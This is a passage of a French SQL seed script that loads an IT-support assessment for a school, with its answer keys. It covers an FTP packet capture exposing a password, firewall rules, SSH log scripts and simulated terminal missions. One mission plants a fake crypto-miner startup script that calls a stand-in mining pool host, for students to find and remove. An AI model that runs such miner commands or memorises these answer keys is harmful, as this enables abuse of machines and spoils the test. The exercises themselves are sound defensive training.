paie_novembre_2026.xlsx\\r\\n"],"stream":1},{"no":16,"t":"0.161722","src":"203.0.113.80","dst":"10.0.10.23","proto":"FTP","len":97,"info":"Response: 150 Opening data connection","details":["Transmission Control Protocol, Src: 203.0.113.80, Dst: 10.0.10.23","File Transfer Protocol (FTP)","    Response: 150 Opening data connection\\r\\n"],"stream":1},{"no":17,"t":"0.170044","src":"10.0.10.23","dst":"10.0.0.53","proto":"DNS","len":70,"info":"Standard query 0x77b2 A intranet.ecole.local"},{"no":18,"t":"0.171003","src":"10.0.0.53","dst":"10.0.10.23","proto":"DNS","len":86,"info":"Standard query response 0x77b2 A 10.0.0.30"},{"no":19,"t":"0.180877","src":"10.0.10.23","dst":"10.0.0.30","proto":"HTTP","len":412,"info":"GET /planning HTTP/1.1","details":["Hypertext Transfer Protocol","    GET /planning HTTP/1.1\\r\\n","    Host: intranet.ecole.local\\r\\n"]},{"no":20,"t":"0.190112","src":"10.0.0.30","dst":"10.0.10.23","proto":"HTTP","len":1514,"info":"HTTP/1.1 200 OK (text/html)"},{"no":21,"t":"0.240661","src":"203.0.113.80","dst":"10.0.10.23","proto":"FTP","len":91,"info":"Response: 226 Transfer complete","details":["Transmission Control Protocol, Src: 203.0.113.80, Dst: 10.0.10.23","File Transfer Protocol (FTP)","    Response: 226 Transfer complete\\r\\n"],"stream":1},{"no":22,"t":"0.241900","src":"10.0.10.23","dst":"203.0.113.80","proto":"FTP","len":73,"info":"Request: QUIT","details":["Transmission Control Protocol, Src: 10.0.10.23, Dst: 203.0.113.80","File Transfer Protocol (FTP)","    Request: QUIT\\r\\n"],"stream":1}],"questions":[{"id":"proto","label":"Quel protocole transporte un mot de passe en clair ?","placeholder":"nom du protocole"},{"id":"serveur","label":"Adresse IP du serveur qui reçoit ce mot de passe","placeholder":"x.x.x.x"},{"id":"user","label":"Identifiant utilisé","placeholder":"identifiant"},{"id":"pass","label":"Mot de passe intercepté","placeholder":"mot de passe"},{"id":"fichier","label":"Nom du fichier envoyé","placeholder":"nom du fichier"}],"choices":[{"id":"a","text":"Garder FTP mais changer le mot de passe chaque mois"},{"id":"b","text":"Passer à SFTP (ou FTPS) : la connexion et les identifiants sont chiffrés"},{"id":"c","text":"Envoyer le fichier par HTTP plutôt que par FTP"},{"id":"d","text":"Compresser le fichier en .zip avant l'envoi"}]}$q$::jsonb, 4, $q$Réseaux (activité)$q$, 480, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"answers":{"proto":"FTP","serveur":"203.0.113.80","user":"compta.ecole","pass":"Paie#Novembre26","fichier":"paie_novembre_2026.xlsx"},"choice":"b"}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'subnet', $q$L'école déménage dans un nouveau bâtiment. Découpez le bloc reçu entre les services.$q$, $q${"mode":"vlsm","services":3,"help":false}$q$::jsonb, 3, $q$Réseaux (activité)$q$, 300, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$null$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'ordering', $q$Ces demandes arrivent en même temps. Classez-les de la plus prioritaire à la moins prioritaire (impact et urgence).$q$, $q$[{"id":"i1","text":"Un compte administrateur semble compromis"},{"id":"i2","text":"La messagerie est en panne pour toute l'entreprise"},{"id":"i3","text":"Un poste est en panne, un poste de secours est disponible"},{"id":"i4","text":"Le clavier d'un utilisateur a une touche qui accroche"}]$q$::jsonb, 2, $q$Logique et diagnostic (activité)$q$, 120, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["i1","i2","i3","i4"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'matching', $q$Un nouveau collaborateur de la comptabilité arrive lundi, et un autre part vendredi. Associez chaque situation à la bonne pratique.$q$, $q${"left":[{"id":"l1","text":"Il doit accéder au dossier partagé de la comptabilité"},{"id":"l2","text":"Il demande les droits administrateur pour installer un logiciel"},{"id":"l3","text":"Ses paramètres de poste doivent être identiques à ceux de son service"},{"id":"l4","text":"Son collègue quitte l'entreprise vendredi"},{"id":"l5","text":"Il reçoit ses identifiants"}],"right":[{"id":"r1","text":"L'ajouter au groupe « Comptabilité » qui a les droits sur le dossier"},{"id":"r2","text":"Refuser des droits permanents, vérifier le logiciel et l'installer soi-même"},{"id":"r3","text":"Placer son compte dans l'OU du service, où s'appliquent les GPO"},{"id":"r4","text":"Désactiver le compte le jour du départ, le supprimer plus tard"},{"id":"r5","text":"Mot de passe temporaire à changer à la première connexion, avec le MFA"},{"id":"r6","text":"Copier les droits d'un collègue du même service"}]}$q$::jsonb, 2, $q$Systèmes (activité)$q$, 180, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"l1":"r1","l2":"r2","l3":"r3","l4":"r4","l5":"r5"}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'blocks', $q$Programmez le pare-feu du serveur web de l'école :
• le site (ports 80 et 443) doit rester accessible à tous ;
• SSH (port 22) seulement depuis le réseau interne 10.0.0.0/8 ;
• tout le reste est bloqué.$q$, $q${"help":false,"sample":[{"id":"s1","label":"Visiteur du site","src_ip":"88.12.4.9","dst_port":443,"protocol":"tcp","country":"FR","hour":14,"expected":"allow"},{"id":"s2","label":"Admin au bureau","src_ip":"10.0.4.20","dst_port":22,"protocol":"tcp","country":"FR","hour":10,"expected":"allow"},{"id":"s3","label":"SSH depuis internet","src_ip":"185.220.101.7","dst_port":22,"protocol":"tcp","country":"DE","hour":3,"expected":"block"},{"id":"s4","label":"Base de données exposée","src_ip":"45.83.64.2","dst_port":3306,"protocol":"tcp","country":"RU","hour":2,"expected":"block"}]}$q$::jsonb, 3, $q$Cybersécurité (activité)$q$, 300, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"packets":[{"id":"h1","label":"","src_ip":"92.184.10.3","dst_port":80,"protocol":"tcp","country":"FR","hour":9,"expected":"allow"},{"id":"h2","label":"","src_ip":"51.15.2.8","dst_port":443,"protocol":"tcp","country":"FR","hour":22,"expected":"allow"},{"id":"h3","label":"","src_ip":"203.0.113.5","dst_port":443,"protocol":"tcp","country":"US","hour":4,"expected":"allow"},{"id":"h4","label":"","src_ip":"10.1.2.3","dst_port":22,"protocol":"tcp","country":"FR","hour":11,"expected":"allow"},{"id":"h5","label":"","src_ip":"10.200.0.9","dst_port":22,"protocol":"tcp","country":"FR","hour":23,"expected":"allow"},{"id":"h6","label":"","src_ip":"10.0.0.7","dst_port":443,"protocol":"tcp","country":"FR","hour":15,"expected":"allow"},{"id":"h7","label":"","src_ip":"11.0.0.4","dst_port":22,"protocol":"tcp","country":"US","hour":3,"expected":"block"},{"id":"h8","label":"","src_ip":"192.168.1.10","dst_port":22,"protocol":"tcp","country":"FR","hour":9,"expected":"block"},{"id":"h9","label":"","src_ip":"185.220.101.7","dst_port":22,"protocol":"tcp","country":"DE","hour":2,"expected":"block"},{"id":"h10","label":"","src_ip":"45.83.64.2","dst_port":3389,"protocol":"tcp","country":"RU","hour":1,"expected":"block"},{"id":"h11","label":"","src_ip":"10.0.0.8","dst_port":3306,"protocol":"tcp","country":"FR","hour":10,"expected":"block"},{"id":"h12","label":"","src_ip":"88.12.4.9","dst_port":21,"protocol":"tcp","country":"FR","hour":12,"expected":"block"},{"id":"h13","label":"","src_ip":"8.8.8.8","dst_port":53,"protocol":"udp","country":"US","hour":5,"expected":"block"},{"id":"h14","label":"","src_ip":"10.3.3.3","dst_port":80,"protocol":"tcp","country":"FR","hour":16,"expected":"allow"},{"id":"h15","label":"","src_ip":"77.136.4.1","dst_port":80,"protocol":"tcp","country":"FR","hour":20,"expected":"allow"},{"id":"h16","label":"","src_ip":"100.64.0.1","dst_port":22,"protocol":"tcp","country":"FR","hour":8,"expected":"block"}]}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'sql', $q$La supervision signale des connexions la nuit depuis l'étranger. Dans la table connexions, trouvez les comptes qui se sont connectés AVEC SUCCÈS entre 0 h et 5 h (0 h 00 à 4 h 59) depuis un autre pays que la France (FR). Affichez la colonne compte, une fois par compte.$q$, $q${"mode":"query","setup":"CREATE TABLE connexions (id INTEGER PRIMARY KEY, compte TEXT, pays TEXT, heure TEXT, succes INTEGER);\nINSERT INTO connexions VALUES (1, 'm.durand', 'FR', '2026-10-05 08:12', 1);\nINSERT INTO connexions VALUES (2, 'm.durand', 'FR', '2026-10-05 13:40', 1);\nINSERT INTO connexions VALUES (3, 's.leroy', 'FR', '2026-10-05 09:01', 1);\nINSERT INTO connexions VALUES (4, 's.leroy', 'RO', '2026-10-06 03:17', 0);\nINSERT INTO connexions VALUES (5, 's.leroy', 'RO', '2026-10-06 03:18', 0);\nINSERT INTO connexions VALUES (6, 's.leroy', 'RO', '2026-10-06 03:19', 1);\nINSERT INTO connexions VALUES (7, 'a.benali', 'FR', '2026-10-06 07:55', 1);\nINSERT INTO connexions VALUES (8, 'compta01', 'FR', '2026-10-06 02:30', 1);\nINSERT INTO connexions VALUES (9, 'k.martin', 'ES', '2026-10-06 10:05', 1);\nINSERT INTO connexions VALUES (10, 'k.martin', 'FR', '2026-10-07 08:47', 1);\nINSERT INTO connexions VALUES (11, 'j.petit', 'NG', '2026-10-07 04:02', 1);\nINSERT INTO connexions VALUES (12, 'j.petit', 'FR', '2026-10-07 09:15', 1);\nINSERT INTO connexions VALUES (13, 'a.benali', 'FR', '2026-10-07 23:58', 1);\nINSERT INTO connexions VALUES (14, 'svc.backup', 'FR', '2026-10-08 01:00', 1);\nINSERT INTO connexions VALUES (15, 'm.durand', 'BR', '2026-10-08 02:44', 0);","show_tables":true,"help":false}$q$::jsonb, 2, $q$Cybersécurité (activité)$q$, 300, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"expected_sql":"SELECT DISTINCT compte FROM connexions WHERE succes = 1 AND pays <> 'FR' AND CAST(strftime('%H', heure) AS INTEGER) < 5;","ordered":false}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'password', $q$Vous créez le compte du nouveau collaborateur. Proposez un mot de passe initial conforme à la politique de l'entreprise (évitez un vrai mot de passe).$q$, $q${"mode":"create","help":false,"policy":{"min_length":12,"upper":true,"lower":true,"digit":true,"symbol":true,"min_score":3,"forbid":["cybersup","2026","azerty"]}}$q$::jsonb, 1, $q$Systèmes (activité)$q$, 120, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$null$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'bash', $q$Script Bash : rapport des échecs de connexion SSH$q$, $q${"help":false,"starter":"#!/bin/bash\n\n","mission":"Le serveur web reçoit des tentatives de connexion SSH (journal logs/auth.log). Écrivez un script qui :\n1. crée le fichier rapport.txt avec, pour chaque adresse IP qui a échoué, le nombre d'échecs puis l'IP, de la plus active à la moins active (exemple de ligne : 5 185.220.101.4) ;\n2. affiche à l'écran uniquement le nombre total d'échecs (un nombre seul).\nVotre script sera aussi lancé sur d'autres journaux : il doit fonctionner quel que soit le contenu.","files":{"logs/auth.log":"Oct  6 02:00:37 srv-web sshd[2100]: Failed password for root from 185.220.101.4 port 50300 ssh2\nOct  6 02:01:14 srv-web sshd[2101]: Accepted password for j.martin from 10.0.0.25 port 40000 ssh2\nOct  6 02:01:51 srv-web sshd[2102]: Failed password for admin from 45.155.205.12 port 50300 ssh2\nOct  6 02:02:28 srv-web sshd[2103]: Failed password for test from 10.0.0.99 port 50300 ssh2\nOct  6 02:03:05 srv-web sshd[2104]: Failed password for root from 185.220.101.4 port 50302 ssh2\nOct  6 02:03:42 srv-web sshd[2105]: Failed password for root from 185.220.101.4 port 50301 ssh2\nOct  6 02:04:19 srv-web sshd[2106]: Accepted password for j.martin from 10.0.0.25 port 40001 ssh2\nOct  6 02:04:56 srv-web sshd[2107]: Failed password for root from 185.220.101.4 port 50303 ssh2\nOct  6 02:05:33 srv-web sshd[2108]: Failed password for root from 185.220.101.4 port 50304 ssh2\nOct  6 02:06:10 srv-web sshd[2109]: Failed password for admin from 45.155.205.12 port 50302 ssh2\nOct  6 02:06:47 srv-web sshd[2110]: Failed password for admin from 45.155.205.12 port 50301 ssh2\n"},"checks":[{"label":"Le fichier rapport.txt est créé"},{"label":"rapport.txt : bon nombre d'échecs par IP, du plus grand au plus petit"},{"label":"Le total des échecs est affiché"}]}$q$::jsonb, 3, $q$Scripting et programmation (activité)$q$, 480, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"solution":"grep \"Failed password\" logs/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn > rapport.txt\ngrep -c \"Failed password\" logs/auth.log","checks":[{"label":"Le fichier rapport.txt est créé","kind":"exists","path":"rapport.txt"},{"label":"rapport.txt : bon nombre d'échecs par IP, du plus grand au plus petit","kind":"file","path":"rapport.txt","compare":"lines"},{"label":"Le total des échecs est affiché","kind":"stdout","compare":"lines"}],"variants":[{"logs/auth.log":"Oct  6 02:00:37 srv-web sshd[2100]: Failed password for oracle from 203.0.113.7 port 50300 ssh2\nOct  6 02:01:14 srv-web sshd[2101]: Failed password for oracle from 203.0.113.7 port 50305 ssh2\nOct  6 02:01:51 srv-web sshd[2102]: Failed password for ubuntu from 198.51.100.23 port 50300 ssh2\nOct  6 02:02:28 srv-web sshd[2103]: Failed password for oracle from 203.0.113.7 port 50301 ssh2\nOct  6 02:03:05 srv-web sshd[2104]: Failed password for ubuntu from 198.51.100.23 port 50301 ssh2\nOct  6 02:03:42 srv-web sshd[2105]: Failed password for oracle from 203.0.113.7 port 50306 ssh2\nOct  6 02:04:19 srv-web sshd[2106]: Failed password for ubuntu from 198.51.100.23 port 50303 ssh2\nOct  6 02:04:56 srv-web sshd[2107]: Failed password for pi from 192.0.2.44 port 50301 ssh2\nOct  6 02:05:33 srv-web sshd[2108]: Accepted password for s.leroy from 10.0.0.31 port 40000 ssh2\nOct  6 02:06:10 srv-web sshd[2109]: Failed password for oracle from 203.0.113.7 port 50303 ssh2\nOct  6 02:06:47 srv-web sshd[2110]: Accepted password for s.leroy from 10.0.0.31 port 40002 ssh2\nOct  6 02:07:24 srv-web sshd[2111]: Failed password for ubuntu from 198.51.100.23 port 50302 ssh2\nOct  6 02:08:01 srv-web sshd[2112]: Failed password for root from 10.0.0.8 port 50300 ssh2\nOct  6 02:08:38 srv-web sshd[2113]: Failed password for oracle from 203.0.113.7 port 50302 ssh2\nOct  6 02:09:15 srv-web sshd[2114]: Accepted password for s.leroy from 10.0.0.31 port 40001 ssh2\nOct  6 02:09:52 srv-web sshd[2115]: Failed password for oracle from 203.0.113.7 port 50304 ssh2\nOct  6 02:10:29 srv-web sshd[2116]: Failed password for pi from 192.0.2.44 port 50300 ssh2\n"}]}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'bash', $q$Script Bash : sauvegarde des configurations et nettoyage du cache$q$, $q${"help":false,"starter":"#!/bin/bash\n\n","mission":"Avant une mise à jour de l'application (dossier app/), écrivez un script qui :\n1. crée le dossier sauvegarde/ et y copie tous les fichiers .conf de app/config (pas les .bak) ;\n2. supprime tous les fichiers .tmp de app/cache, sans toucher aux autres fichiers ;\n3. affiche à l'écran uniquement le nombre de fichiers copiés (un nombre seul).\nVotre script sera aussi lancé sur d'autres dossiers : n'écrivez pas les noms de fichiers à la main.","files":{"app/config/web.conf":"listen 8080\nroot /srv/www\n","app/config/db.conf":"host=10.0.0.12\nport=5432\n","app/config/web.conf.bak":"listen 80\n","app/cache/session-1.tmp":"x","app/cache/session-2.tmp":"x","app/cache/LISEZMOI.txt":"Ne pas supprimer ce fichier.\n","app/logs/app.log":"démarrage OK\n"},"checks":[{"label":"sauvegarde/ contient exactement les fichiers .conf"},{"label":"app/cache ne contient plus que les fichiers à garder"},{"label":"Le nombre de fichiers copiés est affiché"}]}$q$::jsonb, 3, $q$Systèmes (activité)$q$, 420, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"solution":"mkdir -p sauvegarde\ncp app/config/*.conf sauvegarde/\nrm -f app/cache/*.tmp\nls sauvegarde | wc -l","checks":[{"label":"sauvegarde/ contient exactement les fichiers .conf","kind":"tree","path":"sauvegarde"},{"label":"app/cache ne contient plus que les fichiers à garder","kind":"tree","path":"app/cache"},{"label":"Le nombre de fichiers copiés est affiché","kind":"stdout","compare":"lines"}],"variants":[{"app/config/web.conf":"listen 8080\n","app/config/db.conf":"host=db\n","app/config/web.conf.bak":"listen 80\n","app/config/mail.conf":"smtp=10.0.0.20\n","app/config/vpn.conf":"port=1194\n","app/config/ancien.conf.bak":"x\n","app/cache/cache-a.tmp":"x","app/cache/cache-b.tmp":"x","app/cache/cache-c.tmp":"x","app/cache/important.dat":"garder\n"}]}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'terminal', $q$Mission terminal : un poste de la salle 12 rame. Traitez le ticket sans gêner l'élève qui travaille dessus.$q$, null, 4, $q$Systèmes (activité)$q$, 360, null) returning id into v_q;
    insert into question_terminals(question_id, scenario, flag) values (v_q, $q${
  "user": "eleve",
  "hostname": "pc-salle-12",
  "home": "/home/eleve",
  "motd": "Connexion SSH au poste pc-salle-12. Un ticket vous attend : cat LISEZMOI.txt\nTapez help pour les commandes disponibles.",
  "files": {
    "/home/eleve/LISEZMOI.txt": "TICKET #2051 · Demandeur : salle 12\n\nLe poste rame énormément depuis hier, le ventilateur souffle à fond.\nL'élève travaille sur son exposé : ne fermez pas ses applications (navigateur, musique).\n\nÀ faire :\n1. Identifier et arrêter ce qui consomme le processeur.\n2. Empêcher qu'il revienne au prochain démarrage.\n3. Noter le nom du programme en cause dans ~/rapport.txt pour le RSSI.\n",
    "/home/eleve/Documents/expose_histoire.txt": "Exposé sur la Révolution française, à finir pour lundi.\n",
    "/home/eleve/.config/navigateur/favoris.txt": "https://www.wikipedia.org\nhttps://www.cybersup.ai\n",
    "/home/eleve/.demarrage/lancer_minage.sh": "#!/bin/bash\n# relance le mineur à chaque démarrage\n/home/eleve/.cache/minage_crypto --pool pool.argent-facile.example:3333 &\n",
    "/home/eleve/.cache/minage_crypto": "(programme)\n"
  },
  "processes": [
    {
      "pid": 1,
      "user": "root",
      "cmd": "/sbin/init",
      "cpu": 0.1
    },
    {
      "pid": 812,
      "cmd": "navigateur --onglets 7",
      "cpu": 1.8,
      "mem": 12.4
    },
    {
      "pid": 977,
      "cmd": "musique --playlist revisions",
      "cpu": 0.6,
      "mem": 2.1
    },
    {
      "pid": 1337,
      "cmd": "/home/eleve/.cache/minage_crypto --pool pool.argent-facile.example:3333",
      "cpu": 97.3,
      "mem": 8.8
    },
    {
      "pid": 1402,
      "cmd": "bash",
      "cpu": 0,
      "mem": 0.3
    }
  ],
  "objectives": [
    {
      "id": "stop",
      "title": "Arrêter le programme qui fait ramer le PC",
      "check": {
        "type": "process_absent",
        "name": "minage_crypto"
      }
    },
    {
      "id": "garder",
      "title": "Laisser tourner le navigateur et la musique",
      "check": {
        "type": "all",
        "checks": [
          {
            "type": "process_present",
            "name": "navigateur"
          },
          {
            "type": "process_present",
            "name": "musique"
          },
          {
            "type": "process_absent",
            "name": "minage_crypto"
          }
        ]
      }
    },
    {
      "id": "relance",
      "title": "Supprimer le fichier caché qui le relance",
      "check": {
        "type": "absent",
        "path": ".demarrage/lancer_minage.sh"
      }
    },
    {
      "id": "rapport",
      "title": "Écrire le nom du coupable dans rapport.txt",
      "check": {
        "type": "contains",
        "path": "rapport.txt",
        "text": "minage"
      }
    }
  ]
}$q$::jsonb, null);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'terminal', $q$Mission terminal : traitez les demandes du jour sur le serveur de fichiers (arrivée d'une collaboratrice, audit des mots de passe, nettoyage).$q$, null, 4, $q$Systèmes (activité)$q$, 540, null) returning id into v_q;
    insert into question_terminals(question_id, scenario, flag) values (v_q, $q${
  "user": "admin",
  "hostname": "srv-fichiers",
  "home": "/home/admin",
  "motd": "Connexion SSH à srv-fichiers, le serveur de partage de l'école. Vos demandes du jour : cat ~/demandes.txt\nTapez help pour les commandes disponibles.",
  "dirs": [
    {
      "path": "/srv/partage",
      "owner": "admin"
    },
    {
      "path": "/srv/partage/compta",
      "owner": "admin"
    },
    {
      "path": "/srv/partage/commun",
      "owner": "admin"
    },
    {
      "path": "/srv/partage/direction",
      "owner": "admin"
    },
    {
      "path": "/srv/partage/temp",
      "owner": "admin"
    },
    {
      "path": "/srv/modeles",
      "owner": "admin"
    }
  ],
  "files": {
    "/home/admin/demandes.txt": "Demandes du jour\n\n1. Julie Martin arrive à la comptabilité lundi. Créez son dossier /srv/partage/compta/julie,\n   déposez-y le document d'accueil (modèle dans /srv/modeles/), et faites en sorte que\n   personne d'autre que le propriétaire ne puisse y entrer (droits 700).\n2. Audit RGPD : des mots de passe traînent en clair dans le partage. Retrouvez TOUS les fichiers\n   de /srv/partage qui contiennent « mot de passe » et déplacez-les dans ~/quarantaine/.\n3. Le dossier /srv/partage/temp est plein : supprimez tous les fichiers .tmp, mais gardez le journal.\n",
    "/srv/modeles/bienvenue.txt": {
      "content": "Bienvenue dans l'équipe !\nVotre identifiant vous sera remis par le service informatique.\n",
      "owner": "admin"
    },
    "/srv/partage/compta/factures_octobre.csv": {
      "content": "fournisseur;montant\nImprimerie;420\n",
      "owner": "admin"
    },
    "/srv/partage/commun/wifi_invites.txt": {
      "content": "Réseau : ECOLE-INVITES\nMot de passe : Bienvenue2026\n",
      "owner": "admin"
    },
    "/srv/partage/commun/menu_cantine.txt": {
      "content": "Lundi : lasagnes\nMardi : poisson\n",
      "owner": "admin"
    },
    "/srv/partage/direction/acces_banque.txt": {
      "content": "Banque en ligne de l'école\nidentifiant : direction-ecole\nmot de passe : Tresor#77\n",
      "owner": "admin"
    },
    "/srv/partage/direction/budget_2027.txt": {
      "content": "Budget prévisionnel, version 3\n",
      "owner": "admin"
    },
    "/srv/partage/temp/export_1.tmp": {
      "content": "x\n",
      "owner": "admin"
    },
    "/srv/partage/temp/export_2.tmp": {
      "content": "x\n",
      "owner": "admin"
    },
    "/srv/partage/temp/cache_impression.tmp": {
      "content": "x\n",
      "owner": "admin"
    },
    "/srv/partage/temp/sauvegarde.log": {
      "content": "sauvegarde OK 02/11\n",
      "owner": "admin"
    }
  },
  "objectives": [
    {
      "id": "dossier",
      "title": "Créer le dossier de Julie avec le document d'accueil",
      "check": {
        "type": "all",
        "checks": [
          {
            "type": "exists",
            "path": "/srv/partage/compta/julie",
            "kind": "dir"
          },
          {
            "type": "contains",
            "path": "/srv/partage/compta/julie/bienvenue.txt",
            "text": "Bienvenue"
          }
        ]
      }
    },
    {
      "id": "droits",
      "title": "Dossier de Julie en 700",
      "check": {
        "type": "mode",
        "path": "/srv/partage/compta/julie",
        "mode": "700"
      }
    },
    {
      "id": "quarantaine",
      "title": "Mettre en quarantaine tous les fichiers avec un mot de passe",
      "check": {
        "type": "all",
        "checks": [
          {
            "type": "exists",
            "path": "quarantaine/wifi_invites.txt"
          },
          {
            "type": "exists",
            "path": "quarantaine/acces_banque.txt"
          },
          {
            "type": "absent",
            "path": "/srv/partage/commun/wifi_invites.txt"
          },
          {
            "type": "absent",
            "path": "/srv/partage/direction/acces_banque.txt"
          },
          {
            "type": "exists",
            "path": "/srv/partage/commun/menu_cantine.txt"
          },
          {
            "type": "exists",
            "path": "/srv/partage/direction/budget_2027.txt"
          }
        ]
      }
    },
    {
      "id": "temp",
      "title": "Vider les .tmp en gardant le journal",
      "check": {
        "type": "all",
        "checks": [
          {
            "type": "absent",
            "path": "/srv/partage/temp/export_1.tmp"
          },
          {
            "type": "absent",
            "path": "/srv/partage/temp/export_2.tmp"
          },
          {
            "type": "absent",
            "path": "/srv/partage/temp/cache_impression.tmp"
          },
          {
            "type": "exists",
            "path": "/srv/partage/temp/sauvegarde.log"
          }
        ]
      }
    }
  ]
}$q$::jsonb, null);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'terminal', $q$Mission terminal : la sauvegarde de nuit échoue depuis trois nuits. Trouvez la cause, corrigez proprement et remettez le service en route.$q$, null, 4, $q$Systèmes (activité)$q$, 540, null) returning id into v_q;
    insert into question_terminals(question_id, scenario, flag) values (v_q, $q${
  "user": "tech",
  "hostname": "srv-backup",
  "home": "/home/tech",
  "motd": "Connexion SSH à srv-backup. Un ticket vous attend : cat TICKET-2077.txt\nAide-mémoire : systemctl status service · journalctl -u service · df -h · sudo du -sh /var/log/* · sudo systemctl restart|enable service\nsudo -l liste ce que vous pouvez faire en root ; help liste toutes les commandes.",
  "disks": [
    {
      "mount": "/",
      "device": "/dev/sda1",
      "size_mb": 30720,
      "base_mb": 6200
    },
    {
      "mount": "/var",
      "device": "/dev/sdb1",
      "size_mb": 20480,
      "base_mb": 2800
    }
  ],
  "files": {
    "/home/tech/TICKET-2077.txt": "TICKET #2077 · Priorité haute · Demandeur : direction\n\nLa sauvegarde automatique du serveur de fichiers échoue depuis trois nuits.\nLe service s'appelle « sauvegarde-nuit ».\n\nÀ faire :\n1. Trouver pourquoi le service est en échec (son état et son journal).\n2. Corriger la cause, SANS supprimer les sauvegardes déjà faites ni les journaux du mois en cours.\n3. Relancer le service et vérifier qu'il tourne.\n4. L'audit a aussi relevé qu'il ne redémarre pas tout seul après un redémarrage du serveur : corrigez-le.\n",
    "/var/log/syslog": {
      "content": "nov. 04 02:00:01 srv-backup CRON[2201]: (root) CMD (systemctl start sauvegarde-nuit)\nnov. 04 02:00:03 srv-backup sauvegarde-nuit[2210]: tar: /var/backups/sauvegarde-2026-11-04.tar.gz: écriture impossible: No space left on device\n",
      "owner": "root",
      "mode": "644",
      "size": 40
    },
    "/var/log/auth.log": {
      "content": "nov. 04 08:55:12 srv-backup sshd[2390]: Accepted publickey for tech from 10.0.99.14\n",
      "owner": "root",
      "mode": "640",
      "size": 12
    },
    "/var/log/ancien/debug-2026-07.log.gz": {
      "content": "(archive compressée de journaux de débogage, juillet)\n",
      "owner": "root",
      "mode": "644",
      "size": 5800
    },
    "/var/log/ancien/debug-2026-08.log.gz": {
      "content": "(archive compressée de journaux de débogage, août)\n",
      "owner": "root",
      "mode": "644",
      "size": 5900
    },
    "/var/log/ancien/debug-2026-09.log.gz": {
      "content": "(archive compressée de journaux de débogage, septembre)\n",
      "owner": "root",
      "mode": "644",
      "size": 5600
    },
    "/var/log/ancien/LISEZMOI": {
      "content": "Archives de débogage de l'ancienne application, conservées « au cas où ». Plus utilisées depuis la migration de juin.\n",
      "owner": "root",
      "mode": "644"
    },
    "/var/backups/sauvegarde-2026-10-31.tar.gz": {
      "content": "(sauvegarde complète)\n",
      "owner": "root",
      "mode": "600",
      "size": 30
    },
    "/var/backups/sauvegarde-2026-11-01.tar.gz": {
      "content": "(sauvegarde complète)\n",
      "owner": "root",
      "mode": "600",
      "size": 30
    },
    "/etc/systemd/system/sauvegarde-nuit.service": {
      "content": "[Unit]\nDescription=Sauvegarde nocturne du serveur de fichiers\n\n[Service]\nExecStart=/usr/local/bin/sauvegarde.sh\n\n[Install]\nWantedBy=multi-user.target\n",
      "owner": "root",
      "mode": "644"
    }
  },
  "dirs": [
    {
      "path": "/var/log/ancien",
      "owner": "root"
    },
    {
      "path": "/var/backups",
      "owner": "root",
      "mode": "755"
    }
  ],
  "services": [
    {
      "name": "ssh",
      "description": "OpenBSD Secure Shell server",
      "active": true,
      "enabled": true,
      "log": [
        "nov. 04 08:55:12 srv-backup sshd[2390]: Accepted publickey for tech from 10.0.99.14"
      ]
    },
    {
      "name": "cron",
      "description": "Regular background program processing daemon",
      "active": true,
      "enabled": true,
      "log": [
        "nov. 04 02:00:01 srv-backup CRON[2201]: (root) CMD (systemctl start sauvegarde-nuit)"
      ]
    },
    {
      "name": "sauvegarde-nuit",
      "description": "Sauvegarde nocturne du serveur de fichiers",
      "active": false,
      "enabled": false,
      "log": [
        "nov. 02 02:00:03 srv-backup sauvegarde-nuit[1880]: tar: écriture impossible: No space left on device",
        "nov. 03 02:00:03 srv-backup sauvegarde-nuit[2044]: tar: écriture impossible: No space left on device",
        "nov. 04 02:00:03 srv-backup sauvegarde-nuit[2210]: tar: /var/backups/sauvegarde-2026-11-04.tar.gz: écriture impossible: No space left on device",
        "nov. 04 02:00:03 srv-backup systemd[1]: sauvegarde-nuit.service: Failed with result 'exit-code'."
      ],
      "requires": {
        "type": "disk_below",
        "mount": "/var",
        "percent": 90
      },
      "fail": "tar: écriture impossible: No space left on device"
    }
  ],
  "crontab": "0 2 * * * systemctl start sauvegarde-nuit",
  "sudo": [
    "systemctl",
    "rm",
    "du",
    "ls",
    "cat",
    "journalctl"
  ],
  "objectives": [
    {
      "id": "place",
      "title": "Libérer de la place sur /var",
      "check": {
        "type": "disk_below",
        "mount": "/var",
        "percent": 90
      }
    },
    {
      "id": "garder",
      "title": "Garder les sauvegardes et les journaux en cours",
      "check": {
        "type": "all",
        "checks": [
          {
